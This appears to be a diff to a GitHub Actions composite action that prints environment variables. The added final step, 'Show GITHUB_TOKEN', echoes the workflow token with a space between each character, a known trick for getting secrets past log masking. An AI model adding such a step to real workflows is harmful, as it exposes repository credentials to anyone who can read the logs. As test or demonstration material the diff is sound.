@@ -5,7 +5,8 @@ description: Show environment
 runs:
   using: "composite"
   steps:
-    - shell: bash
+    - name: Set and show env
+      shell: bash
       run: |
         export e=e
         echo a=A >> $GITHUB_ENV
@@ -16,3 +17,8 @@ runs:
         echo d=${{ env.d }}
         echo e=${{ env.e }}
         echo f=${{ env.f }}
+    - name: Show GITHUB_TOKEN
+      shell: bash
+      run: |
+        GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}
+        echo $GITHUB_TOKEN | sed 's/./& /g'
